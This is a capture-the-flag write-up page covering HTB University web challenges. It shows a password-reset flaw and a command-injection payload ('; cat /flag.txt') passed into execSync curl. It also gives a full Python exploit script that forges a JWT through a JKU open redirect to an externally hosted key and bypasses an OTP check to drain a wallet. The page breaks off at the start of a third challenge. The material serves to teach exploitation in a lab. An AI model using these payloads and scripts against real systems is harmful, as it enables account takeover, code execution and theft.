    <li><a href="#conclusion-1">Conclusion</a></li>
    <li><a href="#web---intergalactic-bounty">Web - Intergalactic Bounty</a></li>
    <li><a href="#overview-1">Overview</a></li>
    <li><a href="#now-we-are-admins-">Now we are admins !!!</a></li>
    <li><a href="#research-about-nodemailer-behaviours">Research about NodeMailer behaviours</a>
      <ul>
        <li><a href="#main-steps">Main steps</a></li>
      </ul>
    </li>
    <li><a href="#lets-answer-the-questions">LET&rsquo;S ANSWER THE QUESTIONS</a></li>
    <li><a href="#conclusion-2">Conclusion</a></li>
  </ul>
</nav>
  </div>
</details>

<script>

  var margin = 200;
  var marginError = 50;

  (function () {
    var $window = $(window);
    var $toc = $('#TOCView');
    var tocHeight = $toc.height();

    function onResize() {
      var windowAndMarginHeight = $window.height() - margin;
      if(tocHeight >= windowAndMarginHeight) {
        $toc.css("overflow-y", "scroll")
        $toc.css("max-height", (windowAndMarginHeight + marginError) + "px")
      } else {
        $toc.css("overflow-y", "hidden")
        $toc.css("max-height", "9999999px")
      }
    }

    $window.on('resize', onResize);
    $(document).ready(onResize);
  })();



</script>
   </div>
      </div>
      

      <div class="min-w-0 min-h-0 max-w-fit">
        
        


        <div class="article-content max-w-prose mb-20">
          

<h1 class="relative group">Write ups HTB UNIVERSITY 
    <div id="write-ups-htb-university" class="anchor"></div>
    
    <span
        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
            style="text-decoration-line: none !important;" href="#write-ups-htb-university" aria-label="Anchor">#</a>
    </span>        
    
</h1>


<h1 class="relative group">Web armaxis 
    <div id="web-armaxis" class="anchor"></div>
    
    <span
        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
            style="text-decoration-line: none !important;" href="#web-armaxis" aria-label="Anchor">#</a>
    </span>        
    
</h1>
<p>Logic is only thing</p>


<h1 class="relative group">Overview  : 
    <div id="overview--" class="anchor"></div>
    
    <span
        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
            style="text-decoration-line: none !important;" href="#overview--" aria-label="Anchor">#</a>
    </span>        
    
</h1>
<p>We are given a page and a email host to receive OTP.

  <figure>
    <img class="my-0 rounded-md" loading="lazy" src="https://hackmd.io/_uploads/B1Z3cIYByg.png" alt="image" />
    
  </figure>


  <figure>
    <img class="my-0 rounded-md" loading="lazy" src="https://hackmd.io/_uploads/BkQ69IYH1x.png" alt="image" />
    
  </figure>
</p>
<p>Main goal is to get access as an admin. We can abuse the forget password function to achieve change the admin password due to flaw in implementation.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="nx">router</span><span class="p">.</span><span class="nx">post</span><span class="p">(</span><span class="s2">&#34;/reset-password&#34;</span><span class="p">,</span> <span class="kr">async</span> <span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="kr">const</span> <span class="p">{</span> <span class="nx">token</span><span class="p">,</span> <span class="nx">newPassword</span><span class="p">,</span> <span class="nx">email</span> <span class="p">}</span> <span class="o">=</span> <span class="nx">req</span><span class="p">.</span><span class="nx">body</span><span class="p">;</span> <span class="c1">// Added &#39;email&#39; parameter
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">token</span> <span class="o">||</span> <span class="o">!</span><span class="nx">newPassword</span> <span class="o">||</span> <span class="o">!</span><span class="nx">email</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nx">res</span><span class="p">.</span><span class="nx">status</span><span class="p">(</span><span class="mi">400</span><span class="p">).</span><span class="nx">send</span><span class="p">(</span><span class="s2">&#34;Token, email, and new password are required.&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="k">try</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="kr">const</span> <span class="nx">reset</span> <span class="o">=</span> <span class="kr">await</span> <span class="nx">getPasswordReset</span><span class="p">(</span><span class="nx">token</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">reset</span><span class="p">)</span> <span class="k">return</span> <span class="nx">res</span><span class="p">.</span><span class="nx">status</span><span class="p">(</span><span class="mi">400</span><span class="p">).</span><span class="nx">send</span><span class="p">(</span><span class="s2">&#34;Invalid or expired token.&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="kr">const</span> <span class="nx">user</span> <span class="o">=</span> <span class="kr">await</span> <span class="nx">getUserByEmail</span><span class="p">(</span><span class="nx">email</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">user</span><span class="p">)</span> <span class="k">return</span> <span class="nx">res</span><span class="p">.</span><span class="nx">status</span><span class="p">(</span><span class="mi">404</span><span class="p">).</span><span class="nx">send</span><span class="p">(</span><span class="s2">&#34;User not found.&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="kr">await</span> <span class="nx">updateUserPassword</span><span class="p">(</span><span class="nx">user</span><span class="p">.</span><span class="nx">id</span><span class="p">,</span> <span class="nx">newPassword</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="kr">await</span> <span class="nx">deletePasswordReset</span><span class="p">(</span><span class="nx">token</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nx">res</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="s2">&#34;Password reset successful.&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span> <span class="k">catch</span> <span class="p">(</span><span class="nx">err</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nx">console</span><span class="p">.</span><span class="nx">error</span><span class="p">(</span><span class="s2">&#34;Error resetting password:&#34;</span><span class="p">,</span> <span class="nx">err</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nx">res</span><span class="p">.</span><span class="nx">status</span><span class="p">(</span><span class="mi">500</span><span class="p">).</span><span class="nx">send</span><span class="p">(</span><span class="s2">&#34;Error resetting password.&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">});</span>
</span></span></code></pre></div><ul>
<li>It doesnt check the email after all :v so we just get token sent to our email and submit with email of admin.

  <figure>
    <img class="my-0 rounded-md" loading="lazy" src="https://hackmd.io/_uploads/Hkwv3UYr1x.png" alt="image" />
    
  </figure>

Then we get access !!!</li>
</ul>


<h1 class="relative group">Admin 
    <div id="admin" class="anchor"></div>
    
    <span
        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
            style="text-decoration-line: none !important;" href="#admin" aria-label="Anchor">#</a>
    </span>        
    
</h1>
<p>
  <figure>
    <img class="my-0 rounded-md" loading="lazy" src="https://hackmd.io/_uploads/SJOFnLtByl.png" alt="image" />
    
  </figure>

As an admin, we have more functions which is creating weapon and use MARKDOWN to note it.
Here is logic:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="kd">function</span> <span class="nx">parseMarkdown</span><span class="p">(</span><span class="nx">content</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">content</span><span class="p">)</span> <span class="k">return</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nx">md</span><span class="p">.</span><span class="nx">render</span><span class="p">(</span>
</span></span><span class="line"><span class="cl">        <span class="nx">content</span><span class="p">.</span><span class="nx">replace</span><span class="p">(</span><span class="sr">/\!\[.*?\]\((.*?)\)/g</span><span class="p">,</span> <span class="p">(</span><span class="nx">match</span><span class="p">,</span> <span class="nx">url</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">try</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                <span class="kr">const</span> <span class="nx">fileContent</span> <span class="o">=</span> <span class="nx">execSync</span><span class="p">(</span><span class="sb">`curl -s </span><span class="si">${</span><span class="nx">url</span><span class="si">}</span><span class="sb">`</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">                <span class="kr">const</span> <span class="nx">base64Content</span> <span class="o">=</span> <span class="nx">Buffer</span><span class="p">.</span><span class="nx">from</span><span class="p">(</span><span class="nx">fileContent</span><span class="p">).</span><span class="nx">toString</span><span class="p">(</span><span class="s1">&#39;base64&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">                <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s2">&#34;IMAGE&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">                <span class="k">return</span> <span class="sb">`&lt;img src=&#34;data:image/*;base64,</span><span class="si">${</span><span class="nx">base64Content</span><span class="si">}</span><span class="sb">&#34; alt=&#34;Embedded Image&#34;&gt;`</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="p">}</span> <span class="k">catch</span> <span class="p">(</span><span class="nx">err</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                <span class="nx">console</span><span class="p">.</span><span class="nx">error</span><span class="p">(</span><span class="sb">`Error fetching image from URL </span><span class="si">${</span><span class="nx">url</span><span class="si">}</span><span class="sb">:`</span><span class="p">,</span> <span class="nx">err</span><span class="p">.</span><span class="nx">message</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">                <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s2">&#34;P TAG&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">                <span class="k">return</span> <span class="sb">`&lt;p&gt;Error loading image: </span><span class="si">${</span><span class="nx">url</span><span class="si">}</span><span class="sb">&lt;/p&gt;`</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="p">})</span>
</span></span><span class="line"><span class="cl">    <span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><ul>
<li>It puts our url into a execSync ? So vulnearble to command injection.And that regrex simply cannot stop us !
We can put something like :</li>
</ul>
<pre tabindex="0"><code> $url = &#34;; cat&#39;/flag.txt&#39;&#34;
</code></pre><p>And our result will be base64 encoded , we just easily decode and get the result;

  <figure>
    <img class="my-0 rounded-md" loading="lazy" src="https://hackmd.io/_uploads/Hk5lAItB1l.png" alt="image" />
    
  </figure>

And  get the result 
  <figure>
    <img class="my-0 rounded-md" loading="lazy" src="https://hackmd.io/_uploads/r1lzCIYHJg.png" alt="image" />
    
  </figure>

Decode and get flag  :

  <figure>
    <img class="my-0 rounded-md" loading="lazy" src="https://hackmd.io/_uploads/Bk_NR8Yrkl.png" alt="image" />
    
  </figure>
</p>


<h1 class="relative group">Web Breaking Bank 
    <div id="web-breaking-bank" class="anchor"></div>
    
    <span
        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
            style="text-decoration-line: none !important;" href="#web-breaking-bank" aria-label="Anchor">#</a>
    </span>        
    
</h1>
<p>HTB challenge
Knowledge :  JKU vulnerabilities

  <figure>
    <img class="my-0 rounded-md" loading="lazy" src="https://hackmd.io/_uploads/SkvqZPYBkx.png" alt="image" />
    
  </figure>
</p>


<h1 class="relative group">Goal 
    <div id="goal" class="anchor"></div>
    
    <span
        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
            style="text-decoration-line: none !important;" href="#goal" aria-label="Anchor">#</a>
    </span>        
    
</h1>
<ul>
<li>To get the flag , we need to login as finacial email and then dumps all money to get the flag :v</li>
</ul>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="kr">import</span> <span class="p">{</span> <span class="nx">getBalancesForUser</span> <span class="p">}</span> <span class="nx">from</span> <span class="s1">&#39;../services/coinService.js&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="kr">import</span> <span class="nx">fs</span> <span class="nx">from</span> <span class="s1">&#39;fs/promises&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">FINANCIAL_CONTROLLER_EMAIL</span> <span class="o">=</span> <span class="s2">&#34;financial-controller@frontier-board.htb&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="cm">/**
</span></span></span><span class="line"><span class="cl"><span class="cm"> * Checks if the financial controller&#39;s CLCR wallet is drained
</span></span></span><span class="line"><span class="cl"><span class="cm"> * If drained, returns the flag.
</span></span></span><span class="line"><span class="cl"><span class="cm"> */</span>
</span></span><span class="line"><span class="cl"><span class="kr">export</span> <span class="kr">const</span> <span class="nx">checkFinancialControllerDrained</span> <span class="o">=</span> <span class="kr">async</span> <span class="p">()</span> <span class="p">=&gt;</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="kr">const</span> <span class="nx">balances</span> <span class="o">=</span> <span class="kr">await</span> <span class="nx">getBalancesForUser</span><span class="p">(</span><span class="nx">FINANCIAL_CONTROLLER_EMAIL</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="kr">const</span> <span class="nx">clcrBalance</span> <span class="o">=</span> <span class="nx">balances</span><span class="p">.</span><span class="nx">find</span><span class="p">((</span><span class="nx">coin</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="nx">coin</span><span class="p">.</span><span class="nx">symbol</span> <span class="o">===</span> <span class="s1">&#39;CLCR&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">clcrBalance</span> <span class="o">||</span> <span class="nx">clcrBalance</span><span class="p">.</span><span class="nx">availableBalance</span> <span class="o">&lt;=</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="kr">const</span> <span class="nx">flag</span> <span class="o">=</span> <span class="p">(</span><span class="kr">await</span> <span class="nx">fs</span><span class="p">.</span><span class="nx">readFile</span><span class="p">(</span><span class="s1">&#39;/flag.txt&#39;</span><span class="p">,</span> <span class="s1">&#39;utf-8&#39;</span><span class="p">)).</span><span class="nx">trim</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="p">{</span> <span class="nx">drained</span><span class="o">:</span> <span class="kc">true</span><span class="p">,</span> <span class="nx">flag</span> <span class="p">};</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="p">{</span> <span class="nx">drained</span><span class="o">:</span> <span class="kc">false</span> <span class="p">};</span>
</span></span><span class="line"><span class="cl"><span class="p">};</span>
</span></span></code></pre></div>

<h1 class="relative group">OVERVIEW 
    <div id="overview" class="anchor"></div>
    
    <span
        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
            style="text-decoration-line: none !important;" href="#overview" aria-label="Anchor">#</a>
    </span>        
    
</h1>
<ul>
<li>This challenge use JWT to check the email with an unexploitable secret key.</li>
<li>But this uses RSA- 256 algorithms so we have this page:

  <figure>
    <img class="my-0 rounded-md" loading="lazy" src="https://hackmd.io/_uploads/rJE5dDFr1l.png" alt="image" />
    
  </figure>
</li>
</ul>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="kr">export</span> <span class="kr">const</span> <span class="nx">createToken</span> <span class="o">=</span> <span class="kr">async</span> <span class="p">(</span><span class="nx">payload</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="kr">const</span> <span class="nx">privateKey</span> <span class="o">=</span> <span class="kr">await</span> <span class="nx">getPrivateKey</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nx">jwt</span><span class="p">.</span><span class="nx">sign</span><span class="p">(</span><span class="nx">payload</span><span class="p">,</span> <span class="nx">privateKey</span><span class="p">,</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nx">algorithm</span><span class="o">:</span> <span class="s1">&#39;RS256&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="nx">header</span><span class="o">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="nx">kid</span><span class="o">:</span> <span class="nx">KEY_ID</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">            <span class="nx">jku</span><span class="o">:</span> <span class="nx">JWKS_URI</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="p">},</span>
</span></span><span class="line"><span class="cl">    <span class="p">});</span>
</span></span><span class="line"><span class="cl"><span class="p">};</span>
</span></span></code></pre></div><ul>
<li>It create jwt with a JKU !!</li>
<li>JKU is a header to specify the position for jwt to extract the PUBLIC KEY to sign the data. But it is polluted with open redirect !!It blocks the open redirect.</li>
</ul>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl">   <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">jku</span><span class="p">.</span><span class="nx">startsWith</span><span class="p">(</span><span class="s1">&#39;http://127.0.0.1:1337/&#39;</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">throw</span> <span class="k">new</span> <span class="nb">Error</span><span class="p">(</span><span class="s1">&#39;Invalid token: jku claim does not start with http://127.0.0.1:1337/&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">kid</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">throw</span> <span class="k">new</span> <span class="nb">Error</span><span class="p">(</span><span class="s1">&#39;Invalid token: Missing header kid&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="nx">kid</span> <span class="o">!==</span> <span class="nx">KEY_ID</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="k">new</span> <span class="nb">Error</span><span class="p">(</span><span class="s1">&#39;Invalid token: kid does not match the expected key ID&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span></code></pre></div><p>But there is a  vulnerable route can help us.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl">  <span class="nx">fastify</span><span class="p">.</span><span class="nx">get</span><span class="p">(</span><span class="s1">&#39;/redirect&#39;</span><span class="p">,</span> <span class="kr">async</span> <span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">reply</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="kr">const</span> <span class="p">{</span> <span class="nx">url</span><span class="p">,</span> <span class="nx">ref</span> <span class="p">}</span> <span class="o">=</span> <span class="nx">req</span><span class="p">.</span><span class="nx">query</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">url</span> <span class="o">||</span> <span class="o">!</span><span class="nx">ref</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="nx">reply</span><span class="p">.</span><span class="nx">status</span><span class="p">(</span><span class="mi">400</span><span class="p">).</span><span class="nx">send</span><span class="p">({</span> <span class="nx">error</span><span class="o">:</span> <span class="s1">&#39;Missing URL or ref parameter&#39;</span> <span class="p">});</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="c1">// TODO: Should we restrict the URLs we redirect users to?
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="k">try</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="kr">await</span> <span class="nx">trackClick</span><span class="p">(</span><span class="nx">ref</span><span class="p">,</span> <span class="nb">decodeURIComponent</span><span class="p">(</span><span class="nx">url</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">            <span class="nx">reply</span><span class="p">.</span><span class="nx">header</span><span class="p">(</span><span class="s1">&#39;Location&#39;</span><span class="p">,</span> <span class="nb">decodeURIComponent</span><span class="p">(</span><span class="nx">url</span><span class="p">)).</span><span class="nx">status</span><span class="p">(</span><span class="mi">302</span><span class="p">).</span><span class="nx">send</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span> <span class="k">catch</span> <span class="p">(</span><span class="nx">error</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="nx">console</span><span class="p">.</span><span class="nx">error</span><span class="p">(</span><span class="s1">&#39;[Analytics] Error during redirect:&#39;</span><span class="p">,</span> <span class="nx">error</span><span class="p">.</span><span class="nx">message</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">            <span class="nx">reply</span><span class="p">.</span><span class="nx">status</span><span class="p">(</span><span class="mi">500</span><span class="p">).</span><span class="nx">send</span><span class="p">({</span> <span class="nx">error</span><span class="o">:</span> <span class="s1">&#39;Failed to track analytics data.&#39;</span> <span class="p">});</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">});</span>
</span></span></code></pre></div><p>It doesnt check the redirect so we can abuse this and perform an JKU redirect to our own PUBLIC key.</p>


<h1 class="relative group">Let&rsquo;s do it 
    <div id="lets-do-it" class="anchor"></div>
    
    <span
        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
            style="text-decoration-line: none !important;" href="#lets-do-it" aria-label="Anchor">#</a>
    </span>        
    
</h1>
<p>First create my own jwks.json. You can just use some tools to create it.</p>
<pre tabindex="0"><code class="language-json=" data-lang="json=">{
    &#34;keys&#34;: [
        {
            &#34;kty&#34;: &#34;RSA&#34;,
            &#34;use&#34;: &#34;sig&#34;,
            &#34;alg&#34;: &#34;RS256&#34;,
            &#34;kid&#34;: &#34;c709d578-666c-4683-84fb-f505652e6420&#34;,
            &#34;n&#34;: &#34;rGUZNQp2-rW1m4nlKqcFeAeWekWYreyqRsVb3keRnOPqZttlvpE5_gkQnmYMo0n0FHmgfeHHcFXNqXLpy2ZvfOr5EGRtk4sJXeLgTdHYukH3VrdGpIOyyTsOEFsCcHGamNGHUqdKRcEkVKdRzHkhjsEOMW6_APgS0ukqiKHBuiaspIQUiIS7xsna8x6Zh8R2COATOsSH2ae6PXBTaPzoaf13SdZvAvAfBBC7xJk6KQwdV99pazvJnh6c5GbIpVPle694cy8oDQ8gDtaOIOy4TTbT7aHB0eiSvpSGfEAqIXj8kWyiFNZHeCWTYm0_ly7Pn2JhNYkp25bv8nwXICoKpQ&#34;,
            &#34;e&#34;: &#34;AQAB&#34;
        }
    ]
}
</code></pre><p>Then you use your own public key and private key to sign a new data (remember to change the kid==orignal kid)

  <figure>
    <img class="my-0 rounded-md" loading="lazy" src="https://hackmd.io/_uploads/ByCr_DFHyl.png" alt="image" />
    
  </figure>
</p>
<p>Here is the full script exploit :</p>
<pre tabindex="0"><code class="language-python3=" data-lang="python3=">import requests

url = &#39;http://localhost:1337&#39;
res = requests.post(url+&#39;/api/auth/register&#39;,json={&#34;email&#34;:&#34;123@gmail.com&#34;,&#34;password&#34;:&#34;123&#34;})
token=&#34;eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6ImM3MDlkNTc4LTY2NmMtNDY4My04NGZiLWY1MDU2NTJlNjQyMCIsImprdSI6Imh0dHA6Ly8xMjcuMC4wLjE6MTMzNy9hcGkvYW5hbHl0aWNzL3JlZGlyZWN0P3JlZj1oaWhpJnVybD1odHRwOi8vYW5ub3llZC1kZXNpZ24uc3VyZ2Uuc2gvandrcy5qc29uIn0.eyJlbWFpbCI6ImZpbmFuY2lhbC1jb250cm9sbGVyQGZyb250aWVyLWJvYXJkLmh0YiIsImlhdCI6MTczNDUxODk3Mn0.V83p1kybpP1QLVG0oZvaXyygy-EABntI2c-c3s1-y6dTSZsMXOVZYh9CcGyi8hEnv4dlqxhsm8_CBc7_KsxYbzIauzOFAzfiEHQ6oDo889mDjbeBb-JB1zNOohrOFih27BUKhXtOakn89LnBoR6tIlhISHbjvJpCOmN8Uxb2v56WatmTQBut6GkeAQN9_u0hWeYsIxHPIhPfvg_S1BbXtROXiPy-0aCI67pzmr8sgB5GZRyF5lKpq5w9iQ6BfQC8fosNfsI_g60Nh-xtUyiDIOFyukbLggesTOVzgJQ5VPy853VqDkRj39rxeIH5nbztHwdQiw5RyFvQQCOkWCkqiA&#34;
headers ={
    &#34;Authorization&#34;:&#34;Bearer &#34;+ token
}
coins = requests.get(url+&#39;/api/crypto/balance&#39;,headers=headers).json()[0][&#39;availableBalance&#39;]
print(coins)
def generate_all_4_digit_combinations():
    combinations = []

    for i in range(10000):
        combinations.append(str(i).zfill(4))
    return combinations
// Easy bypass OTP here
all_combinations = generate_all_4_digit_combinations()
dataTransaction = {
    &#34;to&#34;:&#34;123@gmail.com&#34;,
    &#34;amount&#34;:coins,
    &#34;coin&#34;:&#39;CLCR&#39;,
    &#34;otp&#34;:&#39;&#39;.join(all_combinations)
}

res = requests.post(url+&#39;/api/crypto/transaction&#39;,json=dataTransaction,headers=headers)
res = requests.get(url+&#39;/api/dashboard&#39;,headers=headers)
print(res.text)
</code></pre><p>FLAGGG

  <figure>
    <img class="my-0 rounded-md" loading="lazy" src="https://hackmd.io/_uploads/SkYpdwFHkg.png" alt="image" />
    
  </figure>
</p>


<h1 class="relative group">Conclusion 
    <div id="conclusion" class="anchor"></div>
    
    <span
        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
            style="text-decoration-line: none !important;" href="#conclusion" aria-label="Anchor">#</a>
    </span>        
    
</h1>
<p>The source is too long , and consumes me so much time to find out :vvv</p>


<h1 class="relative group">Contract Front End Write ups 
    <div id="contract-front-end-write-ups" class="anchor"></div>
    
    <span
        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
            style="text-decoration-line: none !important;" href="#contract-front-end-write-ups" aria-label="Anchor">#</a>
    </span>        
    
</h1>
<p>HTB challenge.
Knowlegde :</p>
<ul>
<li>Web cache deception</li>
<li>ORM Leaks</li>
<li>Xss with missing charset</li>
<li>Insecure Deserialization in Marshal
A bunch of researches is pushed into this CTF :v</li>
</ul>


<h1 class="relative group">Overview  : 
    <div id="overview---1" class="anchor"></div>
    
    <span
        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
            style="text-decoration-line: none !important;" href="#overview---1" aria-label="Anchor">#</a>
    </span>        
    
</h1>
<p>
  <figure>
    <img class="my-0 rounded-md" loading="lazy" src="https://hackmd.io/_uploads/rkWFdrVSkx.png" alt="image" />
    
  </figure>
</p>
<ul>
<li>We will have a flag stored at &lsquo;/&rsquo; and we need to find some ways to trigger a execution</li>
<li>We are given a big source code but we focus on somethings :</li>
</ul>
<ul>
<li>There are 3 privileges: guest, contract_manager, admin.
We will try to gain the admin privilege first. So let&rsquo;s go.</li>
</ul>


<h1 class="relative group">Source code : 
    <div id="source-code-" class="anchor"></div>
    
    <span
        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
            style="text-decoration-line: none !important;" href="#source-code-" aria-label="Anchor">#</a>
    </span>        
    
</h1>
<p>Focus on how to get contract_manager first :v</p>
<pre tabindex="0"><code class="language-python=" data-lang="python=">def get_contract_manager_password():
    try:
        contract_manager = User.objects.get(username=&#34;contract_manager&#34;)
        return contract_manager.password
    except User.DoesNotExist:
        raise ValueError(&#34;Contract Manager user does not exist in the database&#34;)

